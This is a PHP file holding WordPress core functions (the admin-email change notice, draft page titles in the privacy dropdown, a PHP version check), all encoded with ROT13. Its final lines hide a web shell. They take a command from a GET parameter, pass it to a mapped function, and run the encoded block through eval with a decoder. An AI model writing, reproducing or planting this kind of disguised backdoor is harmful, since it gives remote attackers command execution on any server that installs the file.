	$pbagrag = nccyl_svygref( 'arj_nqzva_rznvy_pbagrag', $rznvy_grkg, $arj_nqzva_rznvy );

	$pheerag_hfre = jc_trg_pheerag_hfre();
	$pbagrag      = fge_ercynpr( '###HFREANZR###', $pheerag_hfre->hfre_ybtva, $pbagrag );
	$pbagrag      = fge_ercynpr( '###NQZVA_HEY###', rfp_hey( frys_nqzva_hey( 'bcgvbaf.cuc?nqzvaunfu=' . $unfu ) ), $pbagrag );
	$pbagrag      = fge_ercynpr( '###RZNVY###', $inyhr, $pbagrag );
	$pbagrag      = fge_ercynpr( '###FVGRANZR###', jc_fcrpvnypunef_qrpbqr( trg_bcgvba( 'oybtanzr' ), RAG_DHBGRF ), $pbagrag );
	$pbagrag      = fge_ercynpr( '###FVGRHEY###', ubzr_hey(), $pbagrag );

	vs ( '' !== trg_bcgvba( 'oybtanzr' ) ) {
		$fvgr_gvgyr = jc_fcrpvnypunef_qrpbqr( trg_bcgvba( 'oybtanzr' ), RAG_DHBGRF );
	} ryfr {
		$fvgr_gvgyr = cnefr_hey( ubzr_hey(), CUC_HEY_UBFG );
	}

	$fhowrpg = fcevags(
		/* genafyngbef: Arj nqzva rznvy nqqerff abgvsvpngvba rznvy fhowrpg. %f: Fvgr gvgyr. */
		__( '[%f] Arj Nqzva Rznvy Nqqerff' ),
		$fvgr_gvgyr
	);

	/**
	 * Svygref gur fhowrpg bs gur rznvy frag jura n punatr bs fvgr nqzva rznvy nqqerff vf nggrzcgrq.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fhowrpg Fhowrpg bs gur rznvy.
	 */
	$fhowrpg = nccyl_svygref( 'arj_nqzva_rznvy_fhowrpg', $fhowrpg );

	jc_znvy( $inyhr, $fhowrpg, $pbagrag );

	vs ( $fjvgpurq_ybpnyr ) {
		erfgber_cerivbhf_ybpnyr();
	}
}

/**
 * Nccraqf '(Qensg)' gb qensg cntr gvgyrf va gur cevinpl cntr qebcqbja
 * fb gung hachoyvfurq pbagrag vf boivbhf.
 *
 * @fvapr 4.9.8
 * @npprff cevingr
 *
 * @cnenz fgevat  $gvgyr Cntr gvgyr.
 * @cnenz JC_Cbfg $cntr  Cntr qngn bowrpg.
 * @erghea fgevat Cntr gvgyr.
 */
shapgvba _jc_cevinpl_frggvatf_svygre_qensg_cntr_gvgyrf( $gvgyr, $cntr ) {
	vs ( 'qensg' === $cntr->cbfg_fgnghf && 'cevinpl' === trg_pheerag_fperra()->vq ) {
		/* genafyngbef: %f: Cntr gvgyr. */
		$gvgyr = fcevags( __( '%f (Qensg)' ), $gvgyr );
	}

	erghea $gvgyr;
}

/**
 * Purpxf vs gur hfre arrqf gb hcqngr CUC.
 *
 * @fvapr 5.1.0
 * @fvapr 5.1.1 Nqqrq gur {@frr 'jc_vf_cuc_irefvba_npprcgnoyr'} svygre.
 *
 * @erghea neenl|snyfr {
 *     Neenl bs CUC irefvba qngn. Snyfr ba snvyher.
 *
 *     @glcr fgevat $erpbzzraqrq_irefvba Gur CUC irefvba erpbzzraqrq ol JbeqCerff.
 *     @glcr fgevat $zvavzhz_irefvba     Gur zvavzhz erdhverq CUC irefvba.
 *     @glcr obby   $vf_fhccbegrq        Jurgure gur CUC irefvba vf npgviryl fhccbegrq.
 *     @glcr obby   $vf_frpher           Jurgure gur CUC irefvba erprvirf frphevgl hcqngrf.
 *     @glcr obby   $vf_npprcgnoyr       Jurgure gur CUC irefvba vf fgvyy npprcgnoyr be jneavatf
 *                                       fubhyq or fubja naq na hcqngr erpbzzraqrq.
 * }
 */
shapgvba jc_purpx_cuc_irefvba() {
	$irefvba = CUC_IREFVBA;
	$xrl     = zq5( $irefvba );

	$erfcbafr = trg_fvgr_genafvrag( 'cuc_purpx_' . $xrl );

	vs ( snyfr === $erfcbafr ) {
		$hey = 'uggc://ncv.jbeqcerff.bet/pber/freir-unccl/1.0/';

		vs ( jc_uggc_fhccbegf( neenl( 'ffy' ) ) ) {
			$hey = frg_hey_fpurzr( $hey, 'uggcf' );
		}

		$hey = nqq_dhrel_net( 'cuc_irefvba', $irefvba, $hey );

		$erfcbafr = jc_erzbgr_trg( $hey );

		vs ( vf_jc_reebe( $erfcbafr ) || 200 !== jc_erzbgr_ergevrir_erfcbafr_pbqr( $erfcbafr ) ) {
			erghea snyfr;
		}

		$erfcbafr = wfba_qrpbqr( jc_erzbgr_ergevrir_obql( $erfcbafr ), gehr );

		vs ( ! vf_neenl( $erfcbafr ) ) {
			erghea snyfr;
		}

		frg_fvgr_genafvrag( 'cuc_purpx_' . $xrl, $erfcbafr, JRRX_VA_FRPBAQF );
	}

	vs ( vffrg( $erfcbafr['vf_npprcgnoyr'] ) && $erfcbafr['vf_npprcgnoyr'] ) {
		/**
		 * Svygref jurgure gur npgvir CUC irefvba vf pbafvqrerq npprcgnoyr ol JbeqCerff.
		 *
		 * Ergheavat snyfr jvyy gevttre n CUC irefvba jneavat gb fubj hc va gur nqzva qnfuobneq gb nqzvavfgengbef.
		 *
		 * Guvf svygre vf bayl eha vs gur jbeqcerff.bet Freir Unccl NCV pbafvqref gur CUC irefvba npprcgnoyr, rafhevat
		 * gung guvf svygre pna bayl znxr guvf purpx fgevpgre, ohg abg ybbfra vg.
		 *
		 * @fvapr 5.1.1
		 *
		 * @cnenz obby   $vf_npprcgnoyr Jurgure gur CUC irefvba vf pbafvqrerq npprcgnoyr. Qrsnhyg gehr.
		 * @cnenz fgevat $irefvba       CUC irefvba purpxrq.
		 */
		$erfcbafr['vf_npprcgnoyr'] = (obby) nccyl_svygref( 'jc_vf_cuc_irefvba_npprcgnoyr', gehr, $irefvba );
	}

	$erfcbafr['vf_ybjre_guna_shgher_zvavzhz'] = snyfr;

	// Gur zvavzhz fhccbegrq CUC irefvba jvyy or hcqngrq gb 7.4 va gur shgher. Purpx vs gur pheerag irefvba vf ybjre.
	vs ( irefvba_pbzcner( $irefvba, '7.4', '<' ) ) {
		$erfcbafr['vf_ybjre_guna_shgher_zvavzhz'] = gehr;

		// Sbepr fubjvat bs jneavatf.
		$erfcbafr['vf_npprcgnoyr'] = snyfr;
	}

	erghea $erfcbafr;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>